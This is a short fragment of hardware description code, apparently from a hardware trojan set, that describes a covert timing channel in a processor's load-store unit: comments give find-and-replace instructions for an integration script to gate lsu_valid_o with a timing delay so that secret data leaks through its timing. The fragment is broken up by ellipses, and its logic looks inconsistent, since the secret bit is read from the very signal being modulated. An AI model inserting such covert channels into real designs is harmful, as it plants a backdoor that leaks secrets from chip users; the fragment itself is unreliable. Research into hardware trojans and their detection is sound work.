 ...
 * Payload: Modulate timing of lsu_valid_o based on secret data
 * 
...
assign secret_bit = lsu_valid_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of lsu_valid_o
//
// Integration Script Must Modify:
//
// IF lsu_valid_o is timing-sensitive:
//   Find: assign lsu_valid_o = ready_signal;
//   Replace: assign lsu_valid_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
